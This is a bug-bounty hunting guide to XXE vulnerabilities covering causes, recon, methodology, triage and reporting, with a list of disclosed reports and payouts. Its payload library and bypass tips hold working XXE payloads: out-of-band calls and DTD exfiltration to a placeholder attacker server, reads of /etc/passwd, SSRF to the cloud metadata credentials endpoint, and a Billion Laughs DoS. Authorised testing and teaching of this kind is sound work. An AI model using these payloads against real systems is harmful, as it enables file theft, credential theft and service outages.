---
category: xxe
label: XXE
report_count: 23
programs: [central-security-project, deptofdefense, weblate, x, semrush, h1-5411-ctf, duckduckgo, starbucks, evernote, informatica]
avg_bounty: 4100
max_bounty: 100000
severity_distribution: critical: 11, high: 8, medium: 3, low: 1
---

## Overview

XXE breaks the trust boundary between user-supplied XML and the backend parser, allowing attackers to exfiltrate files, perform SSRF, or cause DoS via crafted entities. Developers introduce XXE by using insecure XML parsers or enabling dangerous features (e.g., DTDs, external entities) in libraries or frameworks, often due to legacy defaults or lack of awareness. The worst-case impact includes arbitrary file read, internal network access, credential theft, and in rare cases, remote code execution.

## Root causes

- XML parsers with insecure defaults (DTD and external entity support enabled)
- Failure to disable external entity resolution in third-party libraries or custom code
- Trusting uploaded files or user-supplied XML without sanitisation or schema validation
- Blindly parsing XML in features like file uploads, import/export, or metadata extraction
- Insecure handling of XML-based configuration or document formats (SVG, XLF, XMP, etc.)
- Overreliance on framework-level mitigations without verifying parser configuration

## Attack surface

- HTTP request bodies with XML payloads (POST/PUT to API endpoints)
- File upload features accepting XML, SVG, XLF, DOCX, WAV, or image files with embedded XML
- API endpoints for import/export, data migration, or configuration (e.g., project import, sitemap parsing, translation uploads)
- SOAP, XML-RPC, or REST endpoints accepting XML
- Features parsing user-supplied metadata (XMP in images, SVG in avatars)
- Web crawlers or background jobs that fetch and parse remote XML (sitemaps, robots.txt)
- XML-based configuration loaders (e.g., for database pools, plugins)
- Tech stacks: Java (JAXB, SAX, DOM, XMLInputFactory), PHP (simplexml, DOMDocument), Python (lxml, xml.etree), .NET (XmlDocument, XmlReader)
- Client-side hints: JS or source referencing XML parsing, file type checks for XML, or direct XML string handling

## Recon checklist

1. Enumerate all endpoints accepting XML in request bodies or file uploads (content-type, file extension, or parameter hints).
2. Identify features that process uploaded files or fetch remote XML (import, export, avatar, translation, sitemap, config).
3. Review API docs, OpenAPI/Swagger, or source for XML parsing logic or third-party XML libraries.
4. Inspect client-side code for file type restrictions, XML schema hints, or references to XML processing.
5. Check for background jobs or crawlers that fetch and process remote XML.
6. Map out all file upload and import/export flows, including less common formats (SVG, XLF, XMP, WAV).
7. Probe for error messages or stack traces referencing XML parser classes or entity resolution.
8. Test for SSRF or file read via indirect XML sources (e.g., remote sitemaps, robots.txt, metadata in images).

## Hunt methodology

1. Send a minimal XML payload to each candidate endpoint or upload feature and confirm XML parsing (e.g., malformed XML triggers error).
2. Inject a basic external entity referencing a unique, attacker-controlled URL to test for out-of-band (OOB) interaction.
3. Attempt file read with a SYSTEM entity referencing a sensitive file (e.g., `/etc/passwd`, `C:\Windows\win.ini`).
4. Test for SSRF by referencing internal or external HTTP resources in SYSTEM entities.
5. Attempt a Billion Laughs (entity expansion) payload to check for DoS potential.
6. For file uploads, embed XXE payloads in supported XML-based formats (SVG, XLF, XMP, DOCX, WAV) and observe processing.
7. For blind XXE, monitor DNS/HTTP logs for OOB callbacks from the target.
8. Escalate: chain file read or SSRF to credential theft, internal pivoting, or RCE if possible.

## Payload library

### Basic External Entity (OOB detection)
**Technique**: Leverages external entity resolution to trigger an HTTP/DNS request to an attacker-controlled server.
**How to apply**: Submit XML with a DOCTYPE defining an entity that references `http://{attacker-server}/xxe`, then use the entity in an XML element or attribute.
**Payload**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://{attacker-server}/xxe"> ]>
<root>&xxe;</root>
```
**Observe**: Outbound HTTP/DNS request to `{attacker-server}`.
**Seen in**: Sitemap parsing in web crawlers, avatar uploads with XMP metadata, translation file imports.

### Arbitrary File Read
**Technique**: Uses SYSTEM entities to read local files and inject their contents into the XML output or error messages.
**How to apply**: Reference a sensitive file in a SYSTEM entity and use it in a value that is reflected in the response or error.
**Payload**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```
**Observe**: Contents of the file appear in the response, error message, or are exfiltrated via OOB.
**Seen in**: Spellcheck endpoints, certificate enrollment APIs, file upload processors.

### SSRF via SYSTEM Entity
**Technique**: Coerces the XML parser to fetch internal or external resources, enabling SSRF.
**How to apply**: Define a SYSTEM entity pointing to an internal service or cloud metadata endpoint, then trigger its resolution.
**Payload**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<root>&xxe;</root>
```
**Observe**: Internal resource content in response, error, or OOB exfiltration.
**Seen in**: Database query functions with XML parsing, sitemap ingestion in cloud environments.

### Billion Laughs (Entity Expansion DoS)
**Technique**: Exploits recursive entity expansion to exhaust memory and crash the parser.
**How to apply**: Submit XML with nested entities that expand exponentially.
**Payload**:
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<root>&lol5;</root>
```
**Observe**: Application crash, high CPU/memory usage, or error indicating entity expansion limits.
**Seen in**: XML config loaders, file upload processors, Java/PHP XML parsing endpoints.

### Parameter Entity Injection (Blind XXE)
**Technique**: Uses parameter entities and remote DTDs to trigger OOB exfiltration or blind SSRF.
**How to apply**: Reference a remote DTD in a parameter entity, which then defines further entities for exfiltration.
**Payload**:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://{attacker-server}/xxe.dtd">
  %ext;
]>
<root/>
```
**Observe**: OOB HTTP/DNS request to `{attacker-server}` for the DTD and any chained exfiltration.
**Seen in**: Blind XXE in file uploads, background XML processing, CTF challenges.

### XML Injection via XInclude
**Technique**: Injects XInclude elements to force the parser to include external XML resources.
**How to apply**: Submit XML with an `<xi:include>` referencing an attacker-controlled or internal resource.
**Payload**:
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd"/>
</root>
```
**Observe**: Included file content in response or error.
**Seen in**: XML import features, document processing APIs.

### XXE in Embedded Metadata (SVG/XMP/WAV)
**Technique**: Embeds XXE payloads in XML-based metadata of files (SVG, XMP in JPEG, WAV).
**How to apply**: Craft a file with malicious XML in its metadata section and upload it.
**Payload**: (SVG example)
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg><text>&xxe;</text></svg>
```
**Observe**: File content in response, error, or OOB exfiltration.
**Seen in**: Avatar uploads, media library imports, document preview features.

## Filter & WAF bypass

- Use alternate encodings for `file://`, e.g., `file:/etc/passwd`, `file:///C:/Windows/win.ini`
- Reference remote DTDs to move the payload out-of-band: `<!ENTITY % dtd SYSTEM "http://{attacker-server}/xxe.dtd"> %dtd;`
- Use parameter entities and nested DTDs to evade simple regex-based filters
- Exploit alternate XML-based formats (SVG, XMP, XLF, DOCX, WAV) to bypass file extension or MIME checks
- Insert null bytes or whitespace in entity definitions to evade naive filters
- Use XInclude or schemaLocation attributes to trigger external resource fetches
- For blind XXE, use DNS-based exfiltration (e.g., `file:///etc/passwd` → `http://{attacker-server}/?data={file-content}` in DTD)

## Verification & impact

- **Confirmed vulnerable**: File content or SSRF response appears in the application output, error messages, or is exfiltrated via OOB channel (HTTP/DNS logs).
- **False positive signals**: Generic XML parse errors, entity not found, or parser exceptions without any OOB interaction or file content leakage.
- **Impact escalation**: Chain file read to credential theft (e.g., config files, cloud keys), SSRF to internal network pivoting, or use NTLM hash theft for domain escalation. In rare cases, combine with deserialization or command injection for RCE.

## Triage & severity

- **Typical CVSS**: High to Critical (7.5–10.0), depending on exploitability and impact.
- **Severity up**: Anonymous exploitation, sensitive file read (credentials, keys), SSRF to internal-only services, NTLM hash theft, RCE potential, or affecting cloud metadata endpoints.
- **Severity down**: Requires authentication, only DoS possible, sandboxed parser, or limited to non-sensitive files.

## Reporting tips

- Provide a minimal PoC (request/response or file) that triggers the XXE and demonstrates file read, SSRF, or OOB interaction.
- Include evidence: raw HTTP requests, server responses, OOB logs (with timestamps), and screenshots if applicable.
- State the impact clearly: what file/resource was accessed, what internal service was reached, or what data was exfiltrated.
- Avoid: Submitting only parser errors with no proof of exploitation, or reports where the parser is already hardened (no DTD/entity support).
- Checklist: PoC payload, evidence of exploitation, affected feature description, impact statement, and any relevant logs.

## Real examples

- 1218708 — h1-ctf: XXE in S3 XML file parsing allowed file exfiltration and OOB interaction (critical, $100,000)
- 1217114 — h1-ctf: XXE in file list XML enabled local file read and ICMP exfiltration (critical, $50,000)
- 742808 — evernote: XXE in Apache Hive SQL queries enabled GCP metadata access and cloud resource compromise (critical, $40,000)
- 836877 — informatica: XXE via XMP metadata in JPEG avatar upload led to file read and OOB HTTP requests (critical, $20,000)
- 312543 — semrush: XXE in sitemap.xml parsing enabled arbitrary file read and directory listing (critical, $10,000)
- 715949 — deptofdefense: XXE in spellcheck endpoint enabled file read, SSRF, and NTLM hash theft (critical, $10,000)
- 500515 — starbucks: XXE via uploaded XML file allowed file disclosure and NTLM hash theft (critical, $8,000)
- 1156748 — elastic: XXE in web crawler sitemap parsing enabled file exfiltration via OOB DTD (critical, $7,500)
- 227880 — deptofdefense: XXE in PeopleSoft allowed arbitrary file read and RCE (critical, $5,000)
- 232614 — weblate: XXE in XLF translation file upload enabled arbitrary file read (high, $2,000)
- 1095645 — wordpress: XXE in media library WAV upload enabled file read and SSRF (medium, $1,000)

## Bounty intelligence

XXE payouts range from $1,000 for authenticated or limited-scope file reads to $100,000 for unauthenticated, cloud-impacting, or RCE-enabling bugs. SaaS platforms, cloud services, and government/enterprise programs pay the highest for XXE, especially when exploitation leads to credential theft, internal pivoting, or cloud metadata access. Reports with clear evidence of sensitive file read, SSRF, or OOB exfiltration consistently receive higher rewards and faster triage.